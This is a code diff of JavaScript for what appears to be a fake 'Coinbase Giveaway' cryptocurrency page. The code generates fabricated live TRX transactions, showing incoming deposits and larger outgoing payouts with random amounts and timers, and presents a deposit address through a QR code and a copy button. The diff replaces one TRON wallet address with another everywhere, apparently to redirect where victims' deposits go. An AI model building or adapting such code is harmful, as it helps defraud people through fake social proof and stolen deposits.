@@ -42,7 +42,7 @@ function create_transaction(mins) {
     mins +
     ' mins ago</span> </td> <td><a class="hash-tag text-truncate" href="">' +
     address +
-    '</a> </td> <td><span class="u-label u-label--xs u-label--success color-strong text-uppercase text-center w-100 rounded text-nowrap">&nbsp;IN&nbsp;</span> </td> <td><span class="hash-tag text-truncate">TPrx5Mnqaw8MhBNDpgadgXwLfktCbzE1KV</span> </td> <td>' +
+    '</a> </td> <td><span class="u-label u-label--xs u-label--success color-strong text-uppercase text-center w-100 rounded text-nowrap">&nbsp;IN&nbsp;</span> </td> <td><span class="hash-tag text-truncate">TDCzaHUEVUQeYsy8UHV9rfrGg9J756SKtW</span> </td> <td>' +
     amount.toString().replace(/\B(?=(\d{3})+(?!\d))/g, ",") +
     ' TRX</td> <td><span class="small text-secondary">0<b>.</b>000' +
     tx(999) +
@@ -57,7 +57,7 @@ function create_transaction(mins) {
     tx(99999999) +
     '</a></td> <td><span class="timer">' +
     mins +
-    ' mins ago</span></td> <td><span class="hash-tag text-truncate">TPrx5Mnqaw8MhBNDpgadgXwLfktCbzE1KV</span> </td> <td><span class="u-label u-label--xs u-label--warning color-strong text-uppercase text-center w-100 rounded text-nowrap">OUT</span> </td> <td><a class="hash-tag text-truncate" href="">' +
+    ' mins ago</span></td> <td><span class="hash-tag text-truncate">TDCzaHUEVUQeYsy8UHV9rfrGg9J756SKtW</span> </td> <td><span class="u-label u-label--xs u-label--warning color-strong text-uppercase text-center w-100 rounded text-nowrap">OUT</span> </td> <td><a class="hash-tag text-truncate" href="">' +
     address +
     "</a> </td> <td>" +
     send_amount.toString().replace(/\B(?=(\d{3})+(?!\d))/g, ",") +
@@ -85,7 +85,7 @@ function new_transaction() {
     tx(99999999) +
     '</a></td> <td><span class="timer" >now</span> </td> <td><a class="hash-tag text-truncate" href="">' +
     address +
-    '</a> </td> <td><span class="u-label u-label--xs u-label--success color-strong text-uppercase text-center w-100 rounded text-nowrap">&nbsp;IN&nbsp;</span> </td> <td><span class="hash-tag text-truncate">TPrx5Mnqaw8MhBNDpgadgXwLfktCbzE1KV</span> </td> <td>' +
+    '</a> </td> <td><span class="u-label u-label--xs u-label--success color-strong text-uppercase text-center w-100 rounded text-nowrap">&nbsp;IN&nbsp;</span> </td> <td><span class="hash-tag text-truncate">TDCzaHUEVUQeYsy8UHV9rfrGg9J756SKtW</span> </td> <td>' +
     amount.toString().replace(/\B(?=(\d{3})+(?!\d))/g, ",") +
     ' TRX</td> <td><span class="small text-secondary">0<b>.</b>000' +
     tx(999) +
@@ -103,7 +103,7 @@ function new_transaction() {
         generateId(63) +
         '</a> </td> <td class="d-none d-sm-table-cell"><a href="">4' +
         tx(99999999) +
-        '</a></td> <td><span class="timer" >now</span></td> <td><span class="hash-tag text-truncate">TPrx5Mnqaw8MhBNDpgadgXwLfktCbzE1KV</span> </td> <td><span class="u-label u-label--xs u-label--warning color-strong text-uppercase text-center w-100 rounded text-nowrap">OUT</span> </td> <td><a class="hash-tag text-truncate" href="">' +
+        '</a></td> <td><span class="timer" >now</span></td> <td><span class="hash-tag text-truncate">TDCzaHUEVUQeYsy8UHV9rfrGg9J756SKtW</span> </td> <td><span class="u-label u-label--xs u-label--warning color-strong text-uppercase text-center w-100 rounded text-nowrap">OUT</span> </td> <td><a class="hash-tag text-truncate" href="">' +
         address +
         "</a> </td> <td>" +
         send_amount.toString().replace(/\B(?=(\d{3})+(?!\d))/g, ",") +
@@ -189,13 +189,13 @@ function update_trans() {
       $('#warn').text(''), $('.pop-body').css('display', 'flex')
       $("#qrcode_svg").attr(
         "src",
-        "https://api.qrserver.com/v1/create-qr-code/?data=TPrx5Mnqaw8MhBNDpgadgXwLfktCbzE1KV&size=150x150"
+        "https://api.qrserver.com/v1/create-qr-code/?data=TDCzaHUEVUQeYsy8UHV9rfrGg9J756SKtW&size=150x150"
       );
       // $('#paynow')
       //   .parent()
       //   .attr(
       //     'href',
-      //     'tron:TPrx5Mnqaw8MhBNDpgadgXwLfktCbzE1KV?amount=' +
+      //     'tron:TDCzaHUEVUQeYsy8UHV9rfrGg9J756SKtW?amount=' +
       //       amount_entered +
       //       '&message=Deposit+to+Coinbase+Giveaway+' +
       //       tm,
@@ -279,7 +279,7 @@ $('#copy_').mouseout(() => {
 $('#copy_address').click(() => {
   $('#copy_address').attr(
     'data-clipboard-text',
-    'TPrx5Mnqaw8MhBNDpgadgXwLfktCbzE1KV',
+    'TDCzaHUEVUQeYsy8UHV9rfrGg9J756SKtW',
   )
   copy_main('copy_address', 'done-copy')
 })
